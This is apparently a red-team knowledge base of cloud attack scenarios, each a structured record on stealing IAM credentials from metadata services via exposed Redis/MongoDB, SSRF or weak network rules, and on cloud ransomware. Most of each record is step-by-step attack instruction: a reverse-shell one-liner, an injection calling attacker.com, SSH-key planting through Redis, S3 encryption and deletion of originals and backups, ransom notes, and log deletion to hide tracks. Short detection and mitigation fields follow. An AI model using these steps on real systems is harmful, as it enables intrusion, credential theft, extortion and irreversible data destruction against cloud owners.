Tools Used: Shodan, MongoDB client, Redis-cli, Netcat, curl, Nmap
Attack Steps: Step 1: Use Shodan or Censys to Discover Exposed DBs - Search for port:27017, port:6379, or port:3306 on Shodan. Filter for cloud hosting providers like AWS, Azure, GCP. Note the IP. Step 2: Connect to the DB and Check for Access - For MongoDB: mongo <ip>:27017. If successful, list DBs using show dbs. For Redis: redis-cli -h <ip> and try INFO. For MySQL: mysql -h <ip> -u root. Step 3: Check for Command Execution (Redis or MongoDB) - On Redis: Try writing to crontab or SSH keys if misconfigured. On MongoDB: Some versions allow $where injection (e.g., db.users.find({$where: 'function() { require("child_process").exec("curl http://attacker.com") }'})). Step 4: Gain Shell or Command Execution - If RCE achieved, spawn shell using reverse shell payload (bash -i >& /dev/tcp/<your-ip>/4444 0>&1) or use netcat. Step 5: Query IMDS from Within Compromised Machine - Use curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ to get IAM role name. Then curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name> to get access keys. Step 6: Configure AWS CLI or Cloud SDK - Use aws configure with stolen keys to access cloud: aws s3 ls, aws ec2 describe-instances. On Azure, similar process using access token from metadata endpoint. Step 7: Lateral Movement / Exploitation - Use permissions to list secrets, access other instances, steal data, or even delete resources. Step 8: Optional Cleanup - Wipe logs, disable auditing, or attempt to hide shell activity if attacker wants stealth.
Target Type: Cloud VM with exposed DB (AWS, GCP, Azure)
Vulnerability: Public DB Ports + No Auth + IMDS Misconfiguration
MITRE Technique: T1525 (Implant Container), T1552.005 (Credential from Metadata), T1059.004 (Unix Shell)
Impact: Unauthorized data access, instance takeover, IAM compromise, pivoting into full account
Detection Method: Monitor DB logs, cloud traffic analysis, unusual access attempts, honeypot alerts
Solution: 1. Bind DBs to localhost (127.0.0.1), not 0.0.0.0 2. Use firewall to restrict access to trusted IPs 3. Enable auth and TLS for DB 4. Use IMDSv2 with hop-limit=1 5. Rotate IAM credentials regularly 6. Use audit logging 7. Do not store secrets in instances
Tags: cloud, mongodb, redis, mysql, metadata, imds, misconfig, open-port, pentest

Title: Exploiting Open Metadata API via Internal Misconfiguration
Attack Type: Cloud Metadata API Exposure via Internal Misconfig
Scenario Description: In this attack, an internal application hosted on a cloud VM (e.g., AWS EC2, Azure VM, GCP) is misconfigured to allow Server-Side Request Forgery (SSRF), Local File Inclusion (LFI), or unrestricted HTTP proxying. This lets an attacker send crafted internal requests to 169.254.169.254 (cloud metadata IP) from the vulnerable app, allowing access to sensitive metadata like IAM credentials.
Tools Used: Burp Suite, curl, HTTP client, vulnerable web app (with SSRF/LFI), cloud instance
Attack Steps: Step 1: Identify an Application Running on a Cloud VM - Find a web app hosted on a cloud provider like AWS EC2, GCP Compute, or Azure VM. You can find these via public IPs from Shodan, or during internal pen-tests. Step 2: Check for SSRF or LFI Vulnerability - Use Burp Suite to intercept and test any user-controlled input that is reflected in backend HTTP requests. Common parameters: url=, redirect=, img=, fetch=, data=, etc. Try injecting internal metadata URL: http://169.254.169.254/latest/meta-data/. Step 3: Exploit SSRF to Access Metadata - If SSRF works, try accessing http://169.254.169.254/latest/meta-data/iam/security-credentials/ to get role name. Then use http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name> to get AWS accessKey, secretKey, and sessionToken. On Azure, use: curl -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01" and for tokens: curl -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com/&api-version=2018-02-01". Step 4: Setup AWS CLI or Azure CLI Using Stolen Credentials - For AWS: run aws configure, enter AccessKey and SecretKey. Now use commands like aws s3 ls, aws ec2 describe-instances, or aws secretsmanager list-secrets. Step 5: Pivot Deeper or Steal Data - List and download sensitive S3 data, read secrets, start/stop instances, modify IAM policies (if role allows). Step 6: Cleanup (Optional) - Since cloud credentials rotate automatically, some attackers exfiltrate credentials fast or create backdoor IAM users. In some SSRF, the attacker proxies access to external command-and-control (C2) or sends data outside.
Vulnerability: Open Metadata APIs reachable due to internal SSRF or misconfigured proxy
MITRE Technique: T1552.005 (Credentials in Metadata), T1071.001 (Web Protocols), T1190 (Exploit Public-Facing App)
Impact: IAM credential theft, access to storage, manipulation of cloud services
Detection Method: Web app firewall logs, app logs, cloud audit logs, metadata request anomalies
Solution: 1. Use IMDSv2 only (requires PUT token) 2. Set hop-limit=1 to block cross-app access 3. Validate all URL inputs (block metadata IPs) 4. Use SSRF protection libraries 5. Apply least privilege to IAM roles 6. Monitor metadata access logs
Tags: imds, ssrf, cloud, aws, azure, gcp, internal misconfig, web app, metadata, pentest

Title: Exploiting IMDS via Over-Permissive Egress (Outbound) Rules
Attack Type: Over-Permissive Outbound Network Access + Metadata Service Exploit
Scenario Description: In this attack, a container, application, or Lambda function running inside a cloud VPC/network is allowed to make unrestricted outbound requests due to misconfigured security groups, NACLs, or firewall rules. The attacker uses this to request cloud metadata (IMDS) and extract cloud credentials by exploiting the lack of egress filtering or by deploying malicious workloads.
Tools Used: Malicious container/image, curl, AWS CLI, Burp Suite, nc
Attack Steps: Step 1: Find a Misconfigured Cloud Workload - Identify a container, Lambda function, or application inside the cloud with egress access to the internet and internal IPs. This may be through misconfigured security group (0.0.0.0/0 for outbound) or lack of NACL filtering. Step 2: Gain Access or Deploy Malicious Code - If you have access to the workload (via CI/CD, exposed API, SSRF, or uploaded function), deploy a malicious script or container that includes basic tools like curl. Step 3: Query IMDS for Metadata - From within the container or function, run: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ to get the IAM role name. Then: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name> to fetch temporary credentials (AccessKey, SecretKey, Token). Step 4: Use Stolen Credentials to Interact with Cloud - Run aws configure, enter credentials. Use commands: aws s3 ls, aws secretsmanager get-secret-value --secret-id <id>, aws iam list-users, aws ec2 describe-instances. Step 5: Laterally Move, Escalate or Exfiltrate Data - Based on IAM privileges, steal sensitive cloud storage data, manipulate services, create backdoor users, or establish persistence. Step 6: Optional - Exfiltrate Credentials or Connect to C2 - If outbound to attacker server is allowed (which often is), exfil the credentials via HTTPS, or connect to a reverse shell or control panel. Step 7: Persistence or Cleanup - Set new roles or policies, create cloudwatch event triggers, or remove traces.
Target Type: Cloud containers, workloads, serverless apps with full egress
Vulnerability: Unrestricted outbound access to metadata IP + exposed roles
MITRE Technique: T1190 (Exploit Cloud Function), T1526 (Cloud Account Discovery), T1552.005 (IMDS Access)
Impact: Full cloud account compromise, data theft, lateral movement
Detection Method: Flow logs, DNS anomalies, metadata IP access from containers/functions
Solution: 1. Block egress to metadata IP from containers using firewalls or routes 2. Restrict IAM roles from sensitive actions 3. Enable IMDSv2 with hop limit 1 4. Implement egress controls in security groups/NACLs 5. Alert on unexpected metadata requests 6. Isolate sensitive workloads
Tags: cloud, imds, egress, outbound rules, aws, lambda, container, metadata, misconfig

Title: Exploiting IMDS via Overly Broad Subnet Access
Attack Type: Internal Lateral Movement via Broad Subnet + Metadata Service Access
Scenario Description: In many cloud environments, network administrators configure overly broad subnet access inside VPCs (e.g., allowing full access from 10.0.0.0/8 or similar). If one internal machine or container gets compromised, the attacker can move laterally to other machines within the subnet and exploit cloud instance metadata endpoints (IMDS) from inside. This allows the attacker to harvest temporary credentials and elevate access.
Tools Used: Nmap, curl, netcat, AWS CLI, Burp Suite
Attack Steps: Step 1: Gain Access to a Single Machine Inside the Cloud Subnet - This could be done using a known vulnerability (e.g., in a web app or container), weak credentials, leaked key, or public exposure. Once you have access to any cloud VM or container in a broad subnet (like 10.0.0.0/8), proceed to explore the network. Step 2: Scan the Internal Network for Live Hosts - Use nmap -sn 10.0.0.0/24 to find other live machines. Narrow down the range if the subnet is large. Then try nmap -p 22,80,443,8080 <ip> on each host to check for exposed services. Step 3: Try Accessing IMDS on Remote Machines - From the first compromised host, attempt SSRF, proxying, or open APIs to make requests to http://169.254.169.254/. You can either abuse web apps running internally or poorly segmented services to bounce requests. Step 4: If You Compromise Another VM, Query IMDS Directly - On the second machine you reached, run: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ to get the IAM role name. Then use: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role> to get the temporary credentials. Step 5: Use Stolen Credentials in AWS CLI - Run aws configure and input the access key, secret key, and token. Then list buckets with aws s3 ls, instances with aws ec2 describe-instances, or secrets with aws secretsmanager list-secrets. Step 6: Move Laterally and Exploit - You can now further pivot to other resources, escalate privileges, or set up persistence (e.g., creating IAM users or roles). Step 7: Optional Cleanup - If remaining stealthy, clear command history (history -c), avoid triggering CloudTrail logs, and limit traffic spikes to avoid detection.
Target Type: Cloud VMs or containers within internal VPC/subnet
Vulnerability: Broad internal network access + lack of IMDSv2 protection
MITRE Technique: T1071.001 (Web Protocols), T1552.005 (Credential in Metadata), T1566.001 (Phishing for Access), T1021.001 (SSH Lateral Movement)
Impact: Complete account takeover, data exfiltration, lateral movement across VPC
Detection Method: Detect internal lateral scans (flow logs), unauthorized metadata access, credential use from unexpected locations
Solution: 1. Restrict subnet access with least-privilege network rules 2. Use IMDSv2 with hop-limit 1 3. Implement micro-segmentation in cloud VPCs 4. Monitor for metadata access from unauthorized services 5. Enable VPC Flow logs + GuardDuty for alerts
Tags: cloud, imds, subnet, lateral movement, aws, vpc, metadata, internal access

Title: Exploiting IMDS via Public Mobile API
Attack Type: Public API Exposure + Cloud Metadata Theft via SSRF
Scenario Description: A mobile app backend API is hosted on a public cloud VM (like AWS EC2 or Azure VM), but the API lacks proper network restrictions or authentication. An attacker analyzes the mobile app, finds API endpoints vulnerable to SSRF or command injection, and uses them to access cloud metadata API (169.254.169.254) to extract IAM role credentials and gain access to the cloud account.
Tools Used: APKTool, Burp Suite, curl, Postman, AWS CLI, jadx
Attack Steps: Step 1: Analyze the Mobile App for API Endpoints - Use APKTool or jadx to reverse engineer the mobile APK and extract URLs/endpoints. Look for base_url, api_url, or any hardcoded paths. Step 2: Intercept Mobile API Traffic with Burp Suite - Configure your phone or emulator to proxy traffic through Burp Suite and interact with the app. Identify API calls and parameters. Step 3: Test API Parameters for SSRF or RCE - Find parameters like url=, path=, img=, download=, etc. Try inserting internal IPs like http://169.254.169.254/latest/meta-data/. If SSRF is successful, you'll get metadata responses. Step 4: Retrieve Cloud Role Credentials - First, hit: http://169.254.169.254/latest/meta-data/iam/security-credentials/ to get the role name. Then query: http://169.254.169.254/latest/meta-data/iam/security-credentials/<role> to extract AccessKeyId, SecretAccessKey, and Token. Step 5: Configure AWS CLI with Retrieved Keys - Use: aws configure to input the credentials. Now access cloud services: aws s3 ls, aws ec2 describe-instances, aws secretsmanager get-secret-value. Step 6: Expand Attack - If permissions allow, you can steal sensitive data, stop or start instances, delete S3 buckets, or even add IAM users for persistence. Step 7: Optional Cleanup - To stay hidden, avoid abuse of rate limits, do not excessively list or modify cloud resources, and monitor logs to avoid being detected.
Vulnerability: Public API + SSRF + access to metadata IP
MITRE Technique: T1552.005 (Credentials in Metadata), T1190 (Exploit Public-Facing App), T1071.001 (Web Protocols)
Impact: Cloud account compromise, user data theft, service disruption
Detection Method: Monitor cloud access logs, API logs, unusual metadata access, credential anomalies
Solution: 1. Never expose cloud VMs to public without security groups/firewalls 2. Require API authentication (JWT/OAuth) 3. Block internal IPs in SSRF (169.254.169.254) 4. Use IMDSv2 with hop-limit=1 5. Apply least privilege to IAM roles 6. Implement Web Application Firewall (WAF)
Tags: cloud, mobile api, imds, ssrf, aws, gcp, azure, public api, cloud pentest
Source: https://hackingthe.cloud, AWS Security Blog, OWASP Mobile Top 10

Title: Exploiting IMDS via Open Redis/Memcached → Code Execution
Attack Type: Remote Code Execution via Exposed In-Memory DB + IMDS Abuse
Scenario Description: In cloud-hosted environments, Redis or Memcached servers are sometimes exposed to the internet without authentication. If an attacker connects to such instances, they may be able to achieve command execution (via SSH key planting, cron overwrite, or file write via Redis), and then query the cloud metadata API (IMDS) from within the compromised VM or container to extract IAM credentials. These credentials can then be used to access cloud services like S3, EC2, Lambda, etc.
Tools Used: Nmap, Redis-cli, Netcat, AWS CLI, curl, Python, Shodan.io
Attack Steps: Step 1: Use Shodan or Censys to Find Exposed Redis/Memcached Servers – Visit shodan.io, search for port:6379 (Redis) or port:11211 (Memcached). Filter for cloud service providers (AWS, GCP, Azure). Note down the IP address of any instance with an open Redis port. Step 2: Try Connecting to Redis Server – Run redis-cli -h <target-ip> from your terminal. If successful and no authentication is required, you’ll get a Redis shell. Type INFO to confirm the server is accessible. Step 3: Check if You Can Write to Files or Execute Commands – Redis allows writing to disk via the CONFIG command if not disabled. Check with CONFIG GET dir and CONFIG GET dbfilename. If allowed, set dir to /root/.ssh/ and dbfilename to authorized_keys. Then, use SET x "<your-ssh-public-key>" and SAVE. This writes your SSH key to /root/.ssh/authorized_keys, allowing you to SSH into the machine. Step 4: SSH into the Server – Run ssh root@<target-ip> and you should gain access if the Redis write was successful. You are now inside a cloud-hosted Linux machine. Step 5: Access IMDS (Cloud Metadata) from Inside – Run: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ to get the role name (on AWS). Then run: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role> to retrieve the temporary credentials (AccessKeyId, SecretAccessKey, Token). On Azure or GCP, modify the metadata endpoint accordingly. Step 6: Use AWS CLI to Exploit Cloud Resources – Run aws configure, paste in the AccessKeyId, SecretAccessKey, and session token. Then list resources like aws s3 ls, aws ec2 describe-instances, aws iam list-users, aws secretsmanager list-secrets. If permissions allow, steal data or create new users for persistence. Step 7: Optional - Exfiltrate or Persist – Send data to an external server using curl or netcat. Add persistence by uploading SSH keys, editing cron jobs, or planting backdoors. Clean up logs (history -c, delete .bash_history) if staying hidden is the goal. Step 8: Note on Memcached – Memcached typically doesn’t allow RCE directly but can be abused if it interacts with web apps or APIs internally (e.g., poisoning cache or SSRF chaining). Use tools like memcached-tool or netcat to interact and inject payloads, then proceed to IMDS step if internal access is gained.
Target Type: Cloud-hosted Redis or Memcached instances (usually Linux VMs or containers)
Vulnerability: Unsecured Redis/Memcached + Lack of IMDSv2 + File Write Capability + Public IP Exposure
MITRE Technique: T1552.005 (Credentials in Metadata), T1203 (Exploitation for Client Execution), T1059.004 (Unix Command Shell), T1190 (Exploit Public-Facing App)
Impact: Full server takeover, IAM credential theft, access to S3 buckets, account manipulation, launching new instances or deleting existing ones
Detection Method: Monitor Redis/Memcached logs, VPC Flow Logs, CloudTrail, unusual metadata requests, open outbound connections to attacker IPs
Solution: 1. Never expose Redis/Memcached directly to the internet. Use VPC-level security groups to restrict access. 2. Require strong authentication or run behind a private bastion or API. 3. Disable dangerous commands (rename-command CONFIG ""). 4. Use IMDSv2 with hop-limit=1 to prevent SSRF or remote access. 5. Least-privilege IAM roles. 6. Set up alerting on metadata access or excessive Redis writes.
Tags: cloud, redis, memcached, rce, imds, metadata, cloud security, aws, lateral movement, misconfig

Title: Mobile Backend IAM Token Exposure → Cloud Ransomware Attack
Attack Type: Mobile App Backend Leak + Cloud Token Abuse
Scenario Description: Many mobile apps directly embed or indirectly fetch cloud IAM tokens (temporary AWS credentials or Azure tokens) from backend APIs. If these credentials are exposed or not properly restricted, an attacker can use them to access VMs, storage, or databases. With sufficient permission, the attacker encrypts data or destroys cloud resources as part of a ransomware-style attack.
Tools Used: JADX / APKTool, Burp Suite, Postman, AWS CLI, Azure CLI, curl, Python
Attack Steps: Step 1: Reverse Engineer the Mobile App – Download the app APK from a device or online store. Use tools like APKTool or jadx to decompile the APK. Search in the decompiled source code for hardcoded access tokens, API keys, or endpoint URLs like https://api.cloud.com/creds, getTemporaryCredentials, etc. Step 2: Monitor API Calls via Mobile App – Use Burp Suite or Charles Proxy to intercept and analyze API calls while the mobile app runs. Look for API responses returning JSON tokens like { "AccessKeyId": "AKIA...", "SecretAccessKey": "...", "SessionToken": "..." }. These are temporary IAM tokens. Step 3: Test the Leaked Token – Use the exposed token to configure AWS CLI: aws configure and paste the values. Try aws sts get-caller-identity to confirm the credentials are active. Do the same with Azure CLI if Azure token is leaked. Step 4: Enumerate Permissions – Run: aws iam list-attached-role-policies, aws s3 ls, aws ec2 describe-instances, aws dynamodb list-tables to see what you can access. Step 5: Launch Ransomware Action – If S3 buckets or EC2 VMs are writable, the attacker may encrypt content. Example: download all S3 objects, encrypt them locally using openssl aes-256-cbc, then re-upload encrypted files (overwriting originals). Optionally, delete the original unencrypted versions from S3. On EC2: use SSH if instance access is possible and encrypt files using bash commands (zip -e, gpg, openssl). Ransom note can be uploaded as README or banner. Step 6: (Optional) Notify Victim and Demand Ransom – Add a ransom.txt in the root folder, set S3 bucket permissions to read-only, or destroy snapshots if allowed. Tokens can also be used to create CloudWatch rules or Lambda functions for persistence. Step 7: Cleanup / Cover Tracks – Delete logs using aws cloudtrail delete-trail (if permissions allow), clear local history using history -c, and invalidate session using STS.
Target Type: Cloud storage (S3), cloud-hosted VMs, cloud database, IAM roles
Vulnerability: Exposed IAM tokens via mobile backend + insufficient IAM policies
MITRE Technique: T1552.001 (Token Theft), T1486 (Data Encrypted for Impact), T1562 (Defense Evasion)
Impact: Data encryption, S3 overwrite or deletion, EC2 instance corruption, service disruption
Detection Method: Monitor for credential use outside of known device IPs, alert on bulk deletes or uploads, watch IAM assume role logs, use anomaly detection in AWS GuardDuty
Solution: 1. Never expose IAM credentials to mobile apps 2. Use Cognito or token exchange via secure server 3. Apply least-privilege IAM roles with limited scopes 4. Monitor API access logs and block credential reuse 5. Apply alerting on storage write/delete APIs
Tags: cloud, mobile api, aws, token leak, ransomware, s3, iam abuse
Source: https://hackingthe.cloud, AWS Blog, OWASP Mobile Top 10

Title: Cloud Ransomware via Public Mobile App Buckets
Attack Type: Exposed Public Storage + Mass Ransomware via App Data Access
Scenario Description: Some mobile apps hardcode direct access URLs to public cloud buckets (AWS S3, Azure Blob). If attackers identify these buckets and have write permissions (via policy misconfiguration), they can mass-encrypt files, destroy backups, or ransom the app data. This is especially dangerous for apps storing medical data, photos, or financial information.
Tools Used: APKTool, AWS CLI, Azure CLI, Cyberduck, Postman, Python
Attack Steps: Step 1: Download and Reverse Engineer the Mobile App – Download the .apk file from your phone or emulator. Use APKTool or jadx-gui to extract the source. Look for hardcoded S3 or Azure Blob URLs like https://myappdata.s3.amazonaws.com/photos/, https://mystorage.blob.core.windows.net/media/. Step 2: Visit the URL in Browser or Script – Paste the bucket URL in your browser or use curl: curl https://myappdata.s3.amazonaws.com. If the bucket is public, you’ll see directory listings or file access. Step 3: Try Uploading or Overwriting – Using Cyberduck or AWS CLI, test if the bucket allows uploads: aws s3 cp ransomware_note.txt s3://myappdata-bucket/ --acl public-read. If successful, proceed. For Azure: use az storage blob upload --account-name mystorage --container-name media --file note.txt. Step 4: Automate Ransomware Upload – Write a Python or Bash script to iterate through all visible files, download them locally, encrypt with openssl (openssl aes-256-cbc -in file.jpg -out file.jpg.enc -k secret), then re-upload the encrypted files and delete the originals using aws s3 rm or az storage blob delete. Step 5: Leave Ransom Note – Upload a ransom.txt file to each directory. Change index.html if it exists to redirect users to the ransom message. Step 6: Optional – Delete Bucket Snapshots or Versioned Files – If the attacker has full permissions, they can delete all S3 version history or blob snapshots, making recovery impossible. Step 7: Cleanup – Remove logs, invalidate any API keys or rotate tokens if they were used to access bucket programmatically.
Target Type: Public AWS S3 or Azure Blob buckets tied to mobile apps
Vulnerability: Public storage access + write/delete permissions misconfigured
MITRE Technique: T1485 (Data Destruction), T1486 (Ransomware), T1552.005 (Cloud Storage Misconfig)
Impact: Ransom of public or sensitive data, file corruption, trust damage, legal risks
Detection Method: Set alerting on public write/delete activity, monitor bucket policies, watch access from unknown IPs or user agents
Solution: 1. Never make storage buckets public unless explicitly required 2. Use signed URLs for access via mobile apps 3. Apply strict bucket policies with write-only or read-only access per role 4. Regularly audit public buckets using tools like AWS Trusted Advisor or Azure Defender 5. Enable versioning and snapshots with backup alerts
Tags: aws, azure, cloud storage, ransomware, mobile, s3, blob, misconfig, pentest
Source: https://hackingthe.cloud, AWS Security Blog, Azure Security Center

Title: Compromised Mobile API Server → Pivot to VM/Cloud
Attack Type: Cloud Ransomware via Accessed VMs / Storage
Scenario Description: In this scenario, an attacker starts by exploiting a vulnerable mobile backend API (e.g., used by a mobile app) hosted on a cloud environment. Once the API server is compromised, the attacker pivots laterally to access internal virtual machines or storage buckets in the cloud environment and launches a ransomware attack — encrypting critical files or VM disks, then demanding ransom. This real-world scenario simulates how weak mobile APIs can become a doorway into entire cloud infrastructures.
Tools Used: Burp Suite, Postman, Nmap, JWT Tool, SSH client, Mimikatz, Metasploit, AWS CLI / Azure CLI / GCP CLI, Netcat, Rclone
Attack Steps: Step 1: Discover the Target API Server – Use tools like Shodan or built-in app traffic sniffing (via Burp Suite or MITM Proxy) to identify the backend API endpoints used by a mobile application. Use Postman or Burp Suite to monitor the mobile app traffic and extract the domain, headers, tokens, and endpoints. Step 2: Perform API Enumeration – Use tools like Postman to interact with the API. Try typical REST methods (GET, POST, PUT, DELETE) on various endpoints. Try unauthenticated access, IDOR (Insecure Direct Object Reference), or missing authentication checks. Step 3: Exploit API Vulnerability – Exploit flaws like no rate-limiting, exposed API keys, or JWT manipulation (using JWT Tool) to gain unauthorized access. For example, if JWT uses "none" algorithm or a hardcoded key, forge admin tokens. Step 4: Achieve Initial Foothold – Once access to API server is achieved, attempt RCE (Remote Code Execution) via vulnerable parameters (e.g., command injection, deserialization). You can use Metasploit for reverse shell payloads (e.g., php/meterpreter/reverse_tcp). Step 5: Get Reverse Shell – Use Netcat or Metasploit to receive a shell from the API server. Confirm you're inside the server environment. Enumerate the system, services, and cloud configuration files. Step 6: Extract Cloud Credentials – Check for environment variables, configuration files like ~/.aws/credentials, ~/.azure/credentials, or /root/.config/gcloud/credentials.json for cloud access tokens. These often exist if the API server uses cloud SDKs. Step 7: Install Cloud CLI Tools – If not already present, download and install AWS CLI / Azure CLI / GCP CLI in the compromised server. Configure them using the credentials obtained in Step 6. Step 8: Verify Cloud Access – Run basic commands like aws s3 ls, az vm list, or gcloud compute instances list to check if the credentials have privileges. If successful, you now have partial/full control over cloud VMs or storage. Step 9: Lateral Movement to VMs – Use SSH key or instance connect to access virtual machines. Cloud CLI tools support direct commands to start/stop VMs, download disks, or connect via terminal. Step 10: Plant Ransomware Payload – Once inside VM (Linux or Windows), upload and execute ransomware scripts using bash or PowerShell. You can write a basic encryption script or use RClone to exfiltrate files to an external location. Step 11: Encrypt or Exfiltrate Cloud Storage – If you have access to cloud storage buckets, encrypt or delete files. You can use AWS CLI aws s3 rm or encrypt everything locally. Step 12: Leave Ransom Note – Create a ransom note in VMs and storage buckets. For example, upload a file like “READ_ME.txt” in /home/ or root directories, with payment instructions. Step 13: Cover Tracks – Clear command history (history -c), logs, and delete temporary tools used. Remove any shell traces and exit. Step 14: Demand Ransom – Use anonymous email or .onion site (e.g., via Tor) to contact the victim or post ransom demand in affected storage. Optionally, use cryptocurrency wallet for payment requests.
Target Type: Mobile API Server + Cloud VMs / Storage
Vulnerability: Insecure API + Cloud Credential Exposure + Inadequate Network Segmentation
MITRE Technique: T1210 (Exploitation of Remote Services), T1078 (Valid Accounts), T1530 (Data from Cloud Storage), T1486 (Data Encrypted for Impact)
Impact: Full cloud infrastructure compromise, data encryption, ransom demand, data loss
Detection Method: Detect unauthorized API usage, abnormal cloud API calls, VM logs, storage deletion events, use EDR and SIEM
Solution: Enforce strong authentication on APIs, rotate credentials, use cloud IAM least privilege, isolate production cloud VMs, monitor API and CLI usage, apply cloud-specific logging and alerts
Tags: Cloud, Mobile, Ransomware, API, Lateral Movement, IAM, Real-world, Beginner-Friendly
Source: Based on real-world incidents and red-team playbooks (APT reports, Cloud PenTesting Frameworks)

Title: Stolen Cloud Metadata via SSRF → Cloud Ransomware
Attack Type: Cloud Ransomware via Accessed VMs / Storage
Scenario Description: In this scenario, an attacker exploits a Server-Side Request Forgery (SSRF) vulnerability in a cloud-hosted web application to access internal cloud metadata endpoints (e.g., AWS, Azure, GCP instance metadata services). These endpoints return temporary credentials for cloud services. Once the attacker extracts the credentials, they pivot into the cloud environment and perform ransomware operations by accessing VMs or storage buckets — encrypting or deleting critical data. This attack abuses misconfigured metadata access and highlights how simple SSRF bugs can lead to massive damage in cloud setups.
Tools Used: Burp Suite, curl, Postman, AWS CLI, Metasploit, Netcat, Rclone
Attack Steps: Step 1: Identify a Web App with SSRF – Use tools like Burp Suite to intercept HTTP request parameters sent to the server. Look for parameters like url=, image=, redirect=, next= which may be vulnerable to SSRF. Test these parameters by changing their value to http://example.com and see if the server responds with data from that URL. Step 2: Test for SSRF Access to Metadata Endpoint – Try accessing the cloud metadata endpoint. For AWS: use http://169.254.169.254/latest/meta-data/ in the vulnerable parameter. For Azure: use http://169.254.169.254/metadata/instance?api-version=2021-02-01. For GCP: use http://metadata.google.internal/computeMetadata/v1/. Modify headers if needed (e.g., add Metadata-Flavor: Google for GCP). Step 3: Extract IAM Credentials – Access the IAM credentials stored in the metadata endpoint. For AWS: go to http://169.254.169.254/latest/meta-data/iam/security-credentials/ to get the role name, and then http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE> to get AccessKeyId, SecretAccessKey, and Token. Step 4: Configure CLI – Install AWS CLI and configure it using aws configure command. Input the stolen credentials here. Step 5: Confirm Access – Run simple cloud commands like aws s3 ls, aws ec2 describe-instances, or aws iam list-users to verify permissions. If permissions are high, you may have full access to cloud resources like VMs and S3 buckets. Step 6: Explore Cloud VMs and Storage – Use commands like aws ec2 describe-instances to get list of running VMs, and aws s3 ls to get list of storage buckets. Step 7: Download and Exfiltrate – Use aws s3 sync s3://<bucket-name> ./localfolder to download data locally, or use Rclone to send it to attacker-controlled cloud. Step 8: Upload and Execute Ransomware – If VM access is available, connect to the instance using SSM Session Manager, EC2 connect, or direct IP and then upload a custom ransomware script (Python/bash/PowerShell). Encrypt files using simple encryption scripts or tools. Step 9: Encrypt or Delete Cloud Data – Use encryption tools or delete commands like aws s3 rm s3://<bucket-name> --recursive to wipe data. You can also encrypt EBS volumes or snapshot and then delete originals. Step 10: Leave Ransom Note – Upload a ransom note in all S3 buckets or VMs. You can upload a file like README.txt with ransom instructions, email, and cryptocurrency wallet for payment. Step 11: Cover Tracks – Delete CloudTrail logs if permissions allow (aws cloudtrail delete-trail). Clear history and logs in VMs. Remove the IAM role if not needed anymore. Step 12: Exit – Stop all your active sessions and ensure no leftover reverse shells or CLI sessions are traceable.
Target Type: Cloud Web App → Cloud VMs and Storage
Vulnerability: SSRF + Cloud Metadata Exposure + Overprivileged IAM Role
MITRE Technique: T1521 (Credential Access via Web Metadata Service), T1530 (Data from Cloud Storage), T1486 (Data Encrypted for Impact)
Impact: Full takeover of cloud resources, data encryption, data exfiltration, ransom demands
Detection Method: Monitor SSRF attempts, access to metadata URLs, use EDR tools on cloud workloads, log and alert on metadata access
Solution: Block metadata access from applications, apply IAM least privilege, use IMDSv2 (AWS), disable legacy metadata endpoints, perform input validation, SSRF protection in app code
Tags: SSRF, Cloud, AWS, Azure, GCP, Ransomware, Metadata, IAM, Beginner Friendly, Realistic
Source: Based on real-world attacks like Capital One breach (2019), SSRF in AWS, Cloud Pentesting Guides

Title: Mobile App Uploads Files to Open Storage → Cloud Ransomware
Attack Type: Cloud Ransomware via Accessed VMs / Storage
Scenario Description: A mobile application uploads media files (images, videos, documents) directly to a cloud storage bucket (e.g., AWS S3, Azure Blob) without access controls (e.g., public-read or full-write enabled). An attacker identifies this bucket using open bucket scanning tools or by intercepting app traffic. The attacker uploads a malicious file (like a ransomware payload) or replaces legitimate files. Once VMs or cloud users access these files, ransomware executes, encrypting data or spreading further.
Tools Used: Apktool, Burp Suite, AWS CLI, s3scanner, Netcat, Python ransomware script, rclone
Attack Steps: Step 1: Identify the Mobile App and Monitor Network Traffic – Download the mobile app (APK) and install it on an emulator like Bluestacks or Genymotion. Intercept app traffic using Burp Suite by configuring it as a proxy. Step 2: Find Cloud Storage Endpoint – Watch for HTTP(S) requests uploading files to cloud storage (e.g., S3 bucket). Look for URLs like https://s3.amazonaws.com/app-media-bucket. Note the bucket name. Step 3: Check Bucket Permissions – Use tools like s3scanner (s3scanner --bucket app-media-bucket) or manually try listing it using aws s3 ls s3://app-media-bucket --no-sign-request. If the bucket allows public read/write, you can upload files to it. Step 4: Upload a Malicious Payload – Create a disguised ransomware payload (e.g., .jpg.exe or .pdf.vbs) using a Python or Bash script that encrypts files on execution. Upload it to the bucket using AWS CLI: aws s3 cp malware.jpg.exe s3://app-media-bucket/ --acl public-read. Step 5: Wait for Execution – Cloud VMs or backend processors that automatically fetch and open these files will execute the ransomware script, encrypting their local files or remote data. Step 6: Spread Laterally – Use tools like Netcat to open reverse shell tunnels from infected machines to attacker. Laterally move by scanning internal IPs and stealing cloud credentials (from ~/.aws/credentials or metadata endpoint). Step 7: Encrypt More Data – Use AWS CLI to list buckets and VMs: aws s3 ls, aws ec2 describe-instances. Exfiltrate or encrypt storage buckets and instance disks. Step 8: Leave a Ransom Note – Upload ransom note (e.g., README.txt) to all S3 buckets and VM root directories. Step 9: Clean Up Traces – Delete access logs and CLI history. Exit the VM and remove payloads if persistence is not needed.
Target Type: Mobile App → Cloud Bucket → Cloud VMs
Vulnerability: Misconfigured S3 / Azure Blob Storage (public-write access)
MITRE Technique: T1530 (Cloud Storage Data Theft), T1486 (Data Encrypted), T1078 (Valid Credentials)
Impact: Unauthorized upload of ransomware payload, cloud-wide data encryption
Detection Method: Monitor bucket changes, file hash comparisons, object event logs
Solution: Apply strict bucket policies, disable public access, scan uploads for malware, implement pre-signed URL access
Tags: Cloud, Ransomware, Mobile Upload, S3, Azure Blob, IAM, Misconfig, Storage Abuse
Source: Real-world based on Uber S3 misconfig, RedTeam S3 testing guides

